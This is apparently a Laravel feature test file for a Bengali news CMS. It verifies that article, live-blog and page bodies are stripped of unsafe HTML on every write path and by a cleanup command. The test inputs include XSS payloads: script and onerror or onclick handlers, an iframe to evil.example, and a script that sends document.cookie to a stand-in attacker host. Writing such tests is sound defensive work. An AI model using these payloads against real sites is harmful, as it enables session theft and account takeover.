<?php

namespace Tests\Feature;

use App\Enums\ArticleStatus;
use App\Enums\ArticleType;
use App\Enums\UserRole;
use App\Models\Article;
use App\Models\Category;
use App\Models\LiveEntry;
use App\Models\Page;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\TestCase;

/**
 * Every editor-written body is sanitised on the way in.
 *
 * Three columns are printed with `{!! !!}`: `articles.body`,
 * `live_entries.body` and `pages.body`. That is safe only for as long as
 * nothing unsafe can reach them, so the guarantee has to live at every write —
 * the admin forms, yes, but also the seeders, an import, a staff account
 * someone has taken over, and tinker.
 *
 * HtmlSanitizerTest covers *what* the allow-list decides. This covers *that the
 * application applies it*, which is the half a vector table cannot prove.
 */
class ContentSanitizeTest extends TestCase
{
    use RefreshDatabase;

    /** Hydrated from the row: strict mode throws on attributes a factory never set. */
    private function editor(): User
    {
        return User::factory()->create(['role' => UserRole::Editor])->fresh();
    }

    private function payload(array $overrides = []): array
    {
        return array_merge([
            'title' => 'পরীক্ষামূলক শিরোনাম',
            'body' => '<p>বিবরণ</p>',
            'category_id' => Category::factory()->create()->id,
            'type' => ArticleType::News->value,
            'status' => ArticleStatus::Draft->value,
            'locale' => 'bn',
        ], $overrides);
    }

    // -----------------------------------------------------------------------
    // Articles — the model, which is where the invariant actually lives
    // -----------------------------------------------------------------------

    public function test_creating_an_article_sanitises_its_body(): void
    {
        $article = Article::factory()->create([
            'body' => '<p>খবর</p><script>alert(1)</script>',
        ]);

        $this->assertSame('<p>খবর</p>', $article->fresh()->body);
    }

    public function test_updating_an_article_sanitises_its_body(): void
    {
        $article = Article::factory()->create(['body' => '<p>প্রথম</p>']);

        $article->update(['body' => '<p onclick="steal()">দ্বিতীয়</p>']);

        $this->assertSame('<p>দ্বিতীয়</p>', $article->fresh()->body);
    }

    /**
     * `ArticleQuery::cards()` selects a subset of columns, and strict mode
     * throws on reading an attribute the model never loaded. The saving hook
     * must not reach for `body` unless `body` was actually set.
     */
    public function test_saving_a_model_that_never_loaded_its_body_does_not_throw(): void
    {
        $article = Article::factory()->create(['body' => '<p>অক্ষত</p>']);

        $partial = Article::query()->select(['id', 'title', 'slug', 'locale', 'status', 'published_at', 'reading_time'])
            ->findOrFail($article->id);

        $partial->title = 'নতুন শিরোনাম';
        $partial->save();

        $this->assertSame('<p>অক্ষত</p>', $article->fresh()->body);
    }

    /** Reading time is derived from the body, so it must reflect the cleaned one. */
    public function test_reading_time_is_computed_after_sanitising(): void
    {
        $noise = '<script>'.str_repeat('alert(1); ', 400).'</script>';

        $withNoise = Article::factory()->create(['body' => '<p>একটি দুটি তিনটি</p>'.$noise]);
        $without = Article::factory()->create(['body' => '<p>একটি দুটি তিনটি</p>']);

        $this->assertSame($without->fresh()->reading_time, $withNoise->fresh()->reading_time);
    }

    // -----------------------------------------------------------------------
    // Articles — the editor form
    // -----------------------------------------------------------------------

    public function test_the_editor_form_cannot_store_a_script(): void
    {
        $this->actingAs($this->editor())
            ->post(route('admin.articles.store'), $this->payload([
                'body' => '<p>খবর</p><script>fetch("//evil.example?c="+document.cookie)</script>',
            ]))
            ->assertRedirect();

        $article = Article::query()->latest('id')->firstOrFail();

        $this->assertSame('<p>খবর</p>', $article->body);
        $this->assertStringNotContainsString('<script', $article->body);
    }

    public function test_the_stored_body_is_what_the_article_page_prints(): void
    {
        $article = Article::factory()->create([
            'body' => '<p>দৃশ্যমান</p><img src="x" onerror="alert(1)"><script>alert(2)</script>',
        ]);

        $response = $this->get($article->url);

        $response->assertOk();
        $response->assertSee('দৃশ্যমান', false);
        $response->assertDontSee('onerror', false);
        $response->assertDontSee('alert(2)', false);
    }

    /**
     * A body of nothing but script is blank once cleaned. Publishing it would
     * otherwise pass the "a published story needs a body" check and produce an
     * empty page — the sanitising in prepareForValidation is what closes that.
     */
    public function test_publishing_a_body_that_sanitises_to_nothing_is_refused(): void
    {
        $this->actingAs($this->editor())
            ->post(route('admin.articles.store'), $this->payload([
                'status' => ArticleStatus::Published->value,
                'body' => '<script>alert(1)</script>',
            ]))
            ->assertSessionHasErrors('body');

        $this->assertSame(0, Article::query()->count());
    }

    // -----------------------------------------------------------------------
    // Live-blog entries
    // -----------------------------------------------------------------------

    private function liveArticle(): Article
    {
        return Article::factory()->create(['type' => ArticleType::Live]);
    }

    public function test_a_live_entry_body_is_sanitised_on_write(): void
    {
        $entry = LiveEntry::create([
            'article_id' => $this->liveArticle()->id,
            'body' => '<p>আপডেট</p><script>alert(1)</script>',
            'published_at' => now(),
        ]);

        $this->assertSame('<p>আপডেট</p>', $entry->fresh()->body);
    }

    public function test_appending_a_live_entry_through_the_admin_cannot_store_a_script(): void
    {
        $article = $this->liveArticle();

        $this->actingAs($this->editor())
            ->post(route('admin.live.store', $article), [
                'body' => '<p>আপডেট</p><img src="x" onerror="alert(1)">',
            ])
            ->assertRedirect();

        $this->assertSame('<p>আপডেট</p><img src="x">', $article->liveEntries()->sole()->body);
    }

    public function test_editing_a_live_entry_sanitises_it_too(): void
    {
        $entry = LiveEntry::create([
            'article_id' => $this->liveArticle()->id,
            'body' => '<p>প্রথম</p>',
            'published_at' => now(),
        ]);

        $this->actingAs($this->editor())
            ->put(route('admin.live.update', $entry), ['body' => '<p onclick="steal()">দ্বিতীয়</p>'])
            ->assertRedirect();

        $this->assertSame('<p>দ্বিতীয়</p>', $entry->fresh()->body);
    }

    /**
     * The polling endpoint feeds `x-html="entry.body"`, which is innerHTML. A
     * `<script>` inserted that way is inert; `<img onerror>` is not. The JSON
     * has to be as clean as the server-rendered timeline.
     */
    public function test_the_polling_payload_carries_the_sanitised_body(): void
    {
        $article = Article::factory()->create(['type' => ArticleType::Live]);

        LiveEntry::create([
            'article_id' => $article->id,
            'body' => '<p>আপডেট</p><img src="x" onerror="alert(1)"><script>alert(2)</script>',
            'published_at' => now(),
        ]);

        $response = $this->getJson(route('api.live', $article));

        $response->assertOk();
        $this->assertStringNotContainsString('onerror', $response->getContent());
        $this->assertStringNotContainsString('alert(2)', $response->getContent());
        $this->assertSame('<p>আপডেট</p><img src="x">', $response->json('entries.0.body'));
    }

    // -----------------------------------------------------------------------
    // Static pages
    // -----------------------------------------------------------------------

    public function test_a_page_body_is_sanitised_on_write(): void
    {
        $page = Page::factory()->create(['body' => '<p>শর্তাবলি</p><script>alert(1)</script>']);

        $this->assertSame('<p>শর্তাবলি</p>', $page->fresh()->body);
    }

    public function test_the_page_form_cannot_store_a_script(): void
    {
        $admin = User::factory()->create(['role' => UserRole::Admin])->fresh();

        $this->actingAs($admin)
            ->post(route('admin.pages.store'), [
                'title' => 'গোপনীয়তা নীতি',
                'slug' => 'privacy',
                'body' => '<p>নীতি</p><iframe src="https://evil.example/x"></iframe>',
                'is_active' => 1,
            ])
            ->assertRedirect();

        $this->assertSame('<p>নীতি</p>', Page::where('slug', 'privacy')->sole()->body);
    }

    public function test_the_stored_page_body_is_what_the_page_prints(): void
    {
        $page = Page::factory()->create([
            'slug' => 'about',
            'is_active' => true,
            'body' => '<p>দৃশ্যমান</p><img src="x" onerror="alert(1)">',
        ]);

        $response = $this->get(route('page.show', $page));

        $response->assertOk();
        $response->assertSee('দৃশ্যমান', false);
        $response->assertDontSee('onerror', false);
    }

    // -----------------------------------------------------------------------
    // content:sanitize
    // -----------------------------------------------------------------------

    /** Rows written before the sanitiser existed are reachable only this way. */
    public function test_the_command_cleans_a_row_written_behind_the_models_back(): void
    {
        $article = Article::factory()->create(['body' => '<p>ঠিক</p>']);

        DB::table('articles')->where('id', $article->id)
            ->update(['body' => '<p>ঠিক</p><script>alert(1)</script>']);

        $this->artisan('content:sanitize')->assertSuccessful();

        $this->assertSame('<p>ঠিক</p>', $article->fresh()->body);
    }

    public function test_a_dry_run_writes_nothing(): void
    {
        $article = Article::factory()->create(['body' => '<p>ঠিক</p>']);
        $dirty = '<p>ঠিক</p><script>alert(1)</script>';

        DB::table('articles')->where('id', $article->id)->update(['body' => $dirty]);

        $this->artisan('content:sanitize --dry-run')->assertSuccessful();

        $this->assertSame($dirty, $article->fresh()->body);
    }

    /** A restored article must not come back carrying markup the live ones lost. */
    public function test_the_command_covers_trashed_articles(): void
    {
        $article = Article::factory()->create(['body' => '<p>ঠিক</p>']);

        DB::table('articles')->where('id', $article->id)
            ->update(['body' => '<p>ঠিক</p><script>alert(1)</script>']);

        $article->delete();

        $this->artisan('content:sanitize')->assertSuccessful();

        $this->assertSame('<p>ঠিক</p>', Article::withTrashed()->findOrFail($article->id)->body);
    }

    /** Run twice, the second run must find nothing to do. */
    public function test_the_command_converges(): void
    {
        Article::factory()->count(3)->create();

        $this->artisan('content:sanitize')->assertSuccessful();

        $before = Article::query()->pluck('body', 'id');

        $this->artisan('content:sanitize')->assertSuccessful();

        $this->assertEquals($before->all(), Article::query()->pluck('body', 'id')->all());
    }

    /** updated_at is editorial metadata; a maintenance sweep must not move it. */
    public function test_the_command_does_not_touch_updated_at(): void
    {
        $article = Article::factory()->create(['body' => '<p>ঠিক</p>']);

        DB::table('articles')->where('id', $article->id)
            ->update(['body' => '<p>ঠিক</p><script>alert(1)</script>']);

        $stamp = $article->fresh()->updated_at;

        $this->travel(1)->hours();
        $this->artisan('content:sanitize')->assertSuccessful();

        $this->assertTrue($stamp->equalTo($article->fresh()->updated_at));
    }

    /** The sweep is not article-only; every unescaped body has to be reachable. */
    public function test_the_command_cleans_pages_and_live_entries_too(): void
    {
        $page = Page::factory()->create(['body' => '<p>ঠিক</p>']);
        $entry = LiveEntry::create([
            'article_id' => $this->liveArticle()->id,
            'body' => '<p>ঠিক</p>',
            'published_at' => now(),
        ]);

        DB::table('pages')->where('id', $page->id)->update(['body' => '<p>ঠিক</p><script>alert(1)</script>']);
        DB::table('live_entries')->where('id', $entry->id)->update(['body' => '<p>ঠিক</p><script>alert(2)</script>']);

        $this->artisan('content:sanitize')->assertSuccessful();

        $this->assertSame('<p>ঠিক</p>', $page->fresh()->body);
        $this->assertSame('<p>ঠিক</p>', $entry->fresh()->body);
    }

    public function test_only_limits_the_sweep_to_one_target(): void
    {
        $article = Article::factory()->create(['body' => '<p>ঠিক</p>']);
        $page = Page::factory()->create(['body' => '<p>ঠিক</p>']);

        $dirty = '<p>ঠিক</p><script>alert(1)</script>';
        DB::table('articles')->where('id', $article->id)->update(['body' => $dirty]);
        DB::table('pages')->where('id', $page->id)->update(['body' => $dirty]);

        $this->artisan('content:sanitize --only=pages')->assertSuccessful();

        $this->assertSame('<p>ঠিক</p>', $page->fresh()->body);
        $this->assertSame($dirty, $article->fresh()->body, 'articles were not asked for');
    }

    public function test_an_unknown_target_fails_rather_than_sweeping_everything(): void
    {
        $this->artisan('content:sanitize --only=comments')->assertFailed();
    }
}
